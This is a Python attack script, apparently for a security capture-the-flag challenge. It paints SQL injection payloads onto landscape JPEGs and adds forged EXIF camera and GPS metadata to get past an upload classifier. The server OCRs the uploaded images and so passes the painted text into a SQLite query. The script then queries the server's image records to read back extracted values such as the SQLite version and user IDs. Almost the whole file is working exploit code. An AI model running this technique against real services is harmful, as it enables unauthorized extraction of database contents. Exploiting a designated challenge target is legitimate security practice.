# v2_exact.py — use the EXACT canvas from v2_final.py that produced '93.46.19' (W<=2000,H260,size30).
# fn.jpg showed the text is crisp; the 500 came from FROM[images] brackets. Now use plain
# 'FROM images' (space) which OCR read in-order for the full 'SELECT user_id FROM images WHERE id=1'.
# Print each image name; validate 200 vs classifier-reject vs SQL-break.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, fname, size=30):   # EXACT working format
    W=min(2000,max(1000,40+int(len(text)*size*0.56))); H=260
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save(fname,"jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),fname)
    return "data:image/jpeg;base64,"+base64.b64encode(open(fname,"rb").read()).decode()

def up(painted, desc):
    CNT[0]+=1
    fname=f"q_{desc}.jpg"
    print(f"[img {fname}] {painted!r}")
    uri=build(painted, fname)
    r=requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    body=r.text[:60].strip().replace("\n"," ")
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
        print(f"   200 OK  ocr={ocr!r}")
    elif "viaje" in body:
        print(f"   {r.status_code} CLASSIFIER-REJECT")
    else:
        print(f"   {r.status_code} SQL-BROKE")
    inner=ocr
    if inner.startswith("9"): inner=inner[1:]
    if inner.endswith("9"): inner=inner[:-1]
    return r.status_code, inner

sq="'"
print("### confirm base ###")
up("9"+sq+"||(SELECT sqlite_version())||"+sq+"9", "base")
print("\n### plain-space FROM images, simple columns ###")
up("9"+sq+"||(SELECT user_id FROM images WHERE id=1)||"+sq+"9", "id1")
up("9"+sq+"||(SELECT user_id FROM images WHERE id=3)||"+sq+"9", "id3")
up("9"+sq+"||(SELECT user_id FROM images LIMIT 1)||"+sq+"9", "lim1")
